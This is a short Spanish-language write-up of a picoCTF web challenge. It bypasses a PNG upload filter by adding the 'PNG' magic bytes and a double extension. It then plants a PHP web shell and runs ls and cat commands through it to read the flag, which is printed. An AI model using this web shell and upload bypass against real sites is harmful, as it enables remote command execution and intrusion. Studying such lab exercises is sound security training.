#notas_hacking #web
# Reto
## Descripción
I found a web app that can help process images: PNG images only! Try it [here](http://atlas.picoctf.net:56505/)!
## Solución
cargamos una imagen en el sitio, vemos que se sube correctamente, vemos en el archivo `robots.txt` hay una ruta que no se indexa `/uploads`
```txt
User-agent: *
Disallow: /instructions.txt
Disallow: /uploads/
```
probamos esta ruta con `http://atlas.picoctf.net:56505/uploads/dog.png` y podemos ver la imagen que se había subido, y en la ruta con `/instructions.txt` aparece
```txt
Let's create a web app for PNG Images processing.
It needs to:
Allow users to upload PNG images
	look for ".png" extension in the submitted files
	make sure the magic bytes match (not sure what this is exactly but wikipedia says that the first few bytes contain 'PNG' in hexadecimal: "50 4E 47" )
after validation, store the uploaded files so that the admin can retrieve them later and do the necessary processing.
```
quiere decir que verifica que tenga `".png"` y que los bytes mágicos (primeros bytes en hexadecimal) digan `"PNG"`, entonces vamos a ejecutar una `web shell`, pero añadiremos los bytes mágicos a esta para que se pueda subir como `png`
```php
PNG
<?php
if(isset($_REQUEST['cmd'])) 
    system($_REQUEST['cmd']);
?>
```
y ejecutamos una vez subida la `web shell` desde la terminal en la ruta `/uploads`
```url
atlas.picoctf.net:56505/uploads/shell.png.php?cmd=ls
atlas.picoctf.net:56505/uploads/shell.png.php?cmd=ls ..
atlas.picoctf.net:56505/uploads/shell.png.php?cmd=cat ../G4ZTCOJYMJSDS.txt
```
`PNG /* picoCTF{c3rt!fi3d_Xp3rt_tr1ckst3r_73198bd9} */`
## Notas

## Referencias
